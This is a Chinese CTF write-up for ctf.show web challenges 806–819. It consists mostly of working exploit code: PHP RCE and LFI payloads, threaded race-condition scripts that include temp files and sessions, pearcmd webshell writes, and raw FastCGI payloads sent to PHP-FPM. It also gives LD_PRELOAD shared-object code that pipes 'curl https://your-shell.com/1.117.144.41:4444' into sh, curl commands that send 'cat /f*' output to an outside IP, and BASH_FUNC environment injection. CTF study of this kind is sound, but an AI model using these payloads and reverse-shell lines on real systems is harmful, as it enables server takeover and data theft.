<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mkdir(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">symlink(<span class="string">&quot;A/B/C/D&quot;</span>,<span class="string">&quot;SD&quot;</span>);</span><br><span class="line">symlink(<span class="string">&quot;SD/../../../../ctfshowflag&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">unlink(<span class="string">&quot;SD&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;SD&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="web806-php无参rce"><a href="#web806-php无参rce" class="headerlink" title="web806 php无参rce"></a>web806 php无参rce</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/?code=<span class="built_in">eval</span>(array_pop(<span class="built_in">next</span>(get_defined_vars())));</span><br><span class="line">post直接可以rce</span><br></pre></td></tr></table></figure>


<h1 id="web807-反弹shell"><a href="#web807-反弹shell" class="headerlink" title="web807 反弹shell"></a>web807 反弹shell</h1><p>群主的网站，只要curl就能弹shell：<a href="https://your-shell.com/">https://your-shell.com/</a></p>
<p>这道题貌似只能curl</p>
<h1 id="web808-php7-0-Segfault-LFI-or-php-session-LFI"><a href="#web808-php7-0-Segfault-LFI-or-php-session-LFI" class="headerlink" title="web808 php7.0 Segfault LFI or php session LFI"></a>web808 php7.0 <strong>Segfault</strong> LFI or php session LFI</h1><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><p>php线程崩溃导致临时文件被保存</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/tmp&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line">url = <span class="string">&quot;http://13d3ac5b-6c38-41c9-9364-ada319d284d3.challenge.ctf.show/&quot;</span></span><br><span class="line">file=&#123;</span><br><span class="line">	<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;cat /*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url+<span class="string">&#x27;?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span>,files=file)</span><br><span class="line">r=requests.get(url)</span><br><span class="line"></span><br><span class="line">tmp=re.findall(<span class="string">&#x27;=&gt; (php.*?)\\n&#x27;</span>,r.text,re.S)[-<span class="number">1</span>]</span><br><span class="line">r=requests.get(url+<span class="string">&#x27;?file=/tmp/&#x27;</span>+tmp)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>核心是<code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code>会让php的线程崩溃</p>
<h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p>包含session</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;flag&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://13d3ac5b-6c38-41c9-9364-ada319d284d3.challenge.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&#x27;http://13d3ac5b-6c38-41c9-9364-ada319d284d3.challenge.ctf.show/?file=/tmp/sess_flag&#x27;</span></span><br><span class="line">data1=&#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;echo 11123;system(&quot;cat /f*&quot;);&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url2,data=data2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;11123&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<h1 id="web809-pear文件包含-x2F-RCE"><a href="#web809-pear文件包含-x2F-RCE" class="headerlink" title="web809 pear文件包含&#x2F;RCE"></a>web809 pear文件包含&#x2F;RCE</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($file) &amp;&amp; !preg_match(<span class="string">&quot;/input|data|phar|log|filter/i&quot;</span>,$file))&#123;</span><br><span class="line">    include $file;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    <span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;info&#x27;</span>]))&#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看p牛的文章：<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=system(<span class="string">&#x27;cat /f*&#x27;</span>);?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/?&gt;&lt;?=<span class="built_in">eval</span>($_POST[<span class="number">1</span>]);?&gt;+/tmp/<span class="number">1.</span>txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: e38c9852-ecd9-442b-984d-3b773381fc5a.challenge.ctf.show</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">101.0</span><span class="number">.4951</span><span class="number">.54</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.9</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span>,en;q=<span class="number">0.8</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<h1 id="web810-SSRF打PHP-FPM"><a href="#web810-SSRF打PHP-FPM" class="headerlink" title="web810 SSRF打PHP-FPM"></a>web810 <strong>SSRF打PHP-FPM</strong></h1><p>用gopherus生成payload打就行</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510203847-ce3wt2b.png" alt="image.png"></p>
<p>后面的%00需要url编码</p>
<h1 id="web811-file-put-contents打PHP-FPM"><a href="#web811-file-put-contents打PHP-FPM" class="headerlink" title="web811 file_put_contents打PHP-FPM"></a>web811 file_put_contents打PHP-FPM</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以通过搭建恶意ftp服务器攻击9000端口的php-fpm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file=ftp://aaa@<span class="number">1.117</span><span class="number">.144</span><span class="number">.41</span>:<span class="number">23</span>/<span class="number">123</span>&amp;content=%01%01%<span class="number">00</span>%01%<span class="number">00</span>%08%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%04%<span class="number">00</span>%01%<span class="number">00</span>%F6%06%<span class="number">00</span>%0F%10SERVER_SOFTWAREgo%<span class="number">20</span>/%20fcgiclient%<span class="number">20</span>%0B%09REMOTE_ADDR127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%0F%08SERVER_PROTOCOLHTTP/<span class="number">1.1</span>%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%<span class="number">20</span>%3D%20On%0Adisable_functions%<span class="number">20</span>%3D%<span class="number">20</span>%0Aauto_prepend_file%<span class="number">20</span>%3D%20php%3A//<span class="built_in">input</span>%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%04%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%05%<span class="number">00</span>%01%<span class="number">00</span>%5C%04%<span class="number">00</span>%3C%3Fphp%20system%<span class="number">28</span>%27curl%20http%3A//<span class="number">1.117</span><span class="number">.144</span><span class="number">.41</span>%3A4444/%60cat%<span class="number">20</span>/f%2A%<span class="number">60</span>/%<span class="number">27</span>%<span class="number">29</span>%3Bdie%<span class="number">28</span>%<span class="number">27</span>-----Made-by-SpyD3r-----%0A%<span class="number">27</span>%<span class="number">29</span>%3B%3F%3E%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span></span><br></pre></td></tr></table></figure>


<p>开恶意ftp服务器然后打就行</p>
<h1 id="web812-PHP-FPM未授权"><a href="#web812-PHP-FPM未授权" class="headerlink" title="web812 PHP-FPM未授权"></a>web812 PHP-FPM未授权</h1><p><a href="https://github.com/wuyunfeng/Python-FastCGI-Client">https://github.com/wuyunfeng/Python-FastCGI-Client</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python exp.py -c <span class="string">&#x27;&lt;?php system(&quot;cat /f*&quot;);?&gt;&#x27;</span> -p <span class="number">28026</span> pwn.challenge.ctf.show /usr/local/lib/php/System.php</span><br></pre></td></tr></table></figure>


<h1 id="web813-劫持mysqli-so"><a href="#web813-劫持mysqli-so" class="headerlink" title="web813 劫持mysqli.so"></a>web813 劫持mysqli.so</h1><p>同样是开了FASTCGI，但是这道题本意让我们用恶意so拓展打</p>
<p>题目满足条件：</p>
<ol>
<li>extension目录已知且可写</li>
<li>命令行或fpm能够加载恶意拓展文件</li>
<li>有调用自定义函数</li>
</ol>
<p>所以主要是考察编写php的拓展so文件从而达到劫持</p>
<p>这里用ext_skel框架开发扩展</p>
<p><a href="https://www.php.net/releases/">https://www.php.net/releases/</a>下载相应版本源码包</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php ext_skel.php --ext ctfshow --std</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220515204421-9sozwed.png" alt="image.png"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220515204451-vsvl7sn.png" alt="image.png"></p>
<p>然后编译</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">phpize</span><br><span class="line">./configure --with-php-config=/www/server/php/<span class="number">73</span>/bin/php-config</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>接着把生成的恶意so文件传到目标服务器的extension目录即可</p>
<p>这里自己尝试的时候的坑：</p>
<ol>
<li>如果用例如宝塔安装的php，要指定他的php-config文件</li>
<li>php-config要和你下载源码，也就是想重写的so文件的php版本一样，否则不能成功</li>
<li>一定要让目标重新把我们恶意的so扩展加载之后才能打</li>
</ol>
<h1 id="web814-LD-PRELOAD"><a href="#web814-LD-PRELOAD" class="headerlink" title="web814 LD_PRELOAD"></a>web814 LD_PRELOAD</h1><p>getuid</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">payload</span>()&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl https://your-shell.com/1.117.144.41:4444 | sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">getuid</span>()</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>)==<span class="literal">NULL</span>)&#123; <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="title function_ invoke__">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">payload</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gcc -c -fPIC poc.c -o hack&amp;&amp;gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure>


<h1 id="web815-劫持构造器"><a href="#web815-劫持构造器" class="headerlink" title="web815 劫持构造器"></a>web815 <strong>劫持构造器</strong></h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define _GNU_SOURCE </span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt; </span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt; </span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt; </span></span><br><span class="line"><span class="title function_ invoke__">__attribute__</span> ((__constructor__)) <span class="keyword">void</span> <span class="title function_ invoke__">preload</span> (<span class="keyword">void</span>) </span><br><span class="line">&#123; </span><br><span class="line">	<span class="title function_ invoke__">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&quot;curl https://your-shell.com/1.117.144.41:4444 | sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="web816-临时文件利用"><a href="#web816-临时文件利用" class="headerlink" title="web816 临时文件利用"></a>web816 <strong>临时文件利用</strong></h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$env</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$env</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="variable">$env</span>.<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/tmp&quot;</span>)[<span class="number">2</span>]);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo ctfshow&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>往tmp目录下面传临时文件，把LD_PRELOAD指向临时文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://da7e9cb2-9fd2-4b66-a4d3-a46b3927d67f.challenge.ctf.show/?env=LD_PRELOAD=/tmp/&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure>

<h1 id="web817-nginx缓存临时文件"><a href="#web817-nginx缓存临时文件" class="headerlink" title="web817 nginx缓存临时文件"></a>web817 nginx缓存临时文件</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\/(\w+\/?)+$/&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">shell_exec</span>(<span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;cat <span class="subst">$file</span>&quot;</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于我是先做的818，所以这里是818之后，仿照羽师傅的脚本自己写的，思路也就是nginx缓存，然后去包含&#x2F;proc&#x2F;fid&#x2F;fd&#x2F;{fd}下的文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">port = <span class="number">28144</span></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">rev=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">s.close()</span><br><span class="line">pid = re.findall(<span class="string">&quot;(.*?)www-data&quot;</span>,rev)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(pid)</span><br><span class="line"></span><br><span class="line">con = <span class="string">&quot;curl http://1.117.144.41:4444/`cat /*`;&quot;</span> + <span class="string">&quot;5&quot;</span> * <span class="number">1024</span> * <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		s = socket.socket()</span><br><span class="line">		s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">		l = <span class="built_in">len</span>(con)</span><br><span class="line">		x = <span class="string">f&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;l&#125;</span></span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;con&#125;</span>&#x27;&#x27;&#x27;</span>.encode()</span><br><span class="line">		s.send(x)</span><br><span class="line">		s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruter</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">40</span>):</span><br><span class="line">			<span class="built_in">print</span>(fd)</span><br><span class="line">			s=socket.socket()</span><br><span class="line">			s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">			s.send(<span class="string">f&#x27;&#x27;&#x27;GET /?file=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: fuckyou</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">			<span class="built_in">print</span>(s.recv(<span class="number">2048</span>).decode())</span><br><span class="line">			s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">	t = threading.Thread(target=upload)</span><br><span class="line">	t.start()</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">	a = threading.Thread(target=bruter)</span><br><span class="line">	a.start()</span><br></pre></td></tr></table></figure>

<h1 id="web818-nginx-body缓存写入临时文件"><a href="#web818-nginx-body缓存写入临时文件" class="headerlink" title="web818 nginx body缓存写入临时文件"></a>web818 nginx body缓存写入临时文件</h1><p>原理略，整理在另一篇笔记</p>
<p>直接学习羽师傅脚本即可，他这里是用socket库来进行网络请求的。</p>
<p>关键点是31行的恶意字节填充，让hack.so的文件内容写入nginx产生的临时文件</p>
<p>接着用bruter函数对proc目录进行一个爆破即可，这里的pid题目中会给到，所以只用爆破后面的fd即可</p>
<p>羽师傅的脚本真的清晰，学习了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">port= <span class="number">28118</span></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">data=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">s.close()</span><br><span class="line">pid = re.findall(<span class="string">&#x27;(.*?) www-data&#x27;</span>,data)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(pid)</span><br><span class="line">l=<span class="built_in">str</span>(<span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>)).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		s=socket.socket()</span><br><span class="line">		s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">		x=<span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Content-Length: &#x27;&#x27;&#x27;</span>+l+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>+<span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">		s.send(x)</span><br><span class="line">		s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruter</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">40</span>):</span><br><span class="line">			<span class="built_in">print</span>(fd)</span><br><span class="line">			s=socket.socket()</span><br><span class="line">			s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">			s.send(<span class="string">f&#x27;&#x27;&#x27;GET /?env=LD_PRELOAD=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">			<span class="built_in">print</span>(s.recv(<span class="number">2048</span>).decode())</span><br><span class="line">			s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    t = threading.Thread(target=upload)</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    a = threading.Thread(target=bruter)</span><br><span class="line">    a.start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web819-环境变量注入"><a href="#web819-环境变量注入" class="headerlink" title="web819 环境变量注入"></a>web819 环境变量注入</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$env = $_GET[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(isset($env))&#123;</span><br><span class="line">    putenv($env);</span><br><span class="line">    system(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?env=BASH_FUNC_whoami%%=() &#123; cat /f*; &#125;</span><br></pre></td></tr></table></figure>

<p>参照p牛的文章</p>
